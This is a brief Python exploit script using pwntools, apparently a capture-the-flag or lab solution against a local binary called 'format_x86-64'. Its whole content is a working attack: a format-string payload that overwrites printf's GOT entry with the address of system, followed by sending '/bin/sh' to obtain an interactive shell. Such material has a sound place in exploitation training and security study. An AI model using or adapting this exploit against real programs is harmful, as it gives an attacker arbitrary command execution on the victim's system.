#!/usr/bin/python
from pwn import *
context.arch = 'amd64'
p = process('./format_x86-64')
elf = ELF('./format_x86-64')
offset = 8
printf_got = elf.got['printf'] # 0x00601020
system_plt = elf.plt['system'] # 0x00400460

payload = 'A%{}c%{}$lln'.format(str(system_plt - 1), str(offset))
payload += p64(printf_got)

p.sendline(payload)
p.recv()
p.sendline('/bin/sh\x00')
p.interactive()
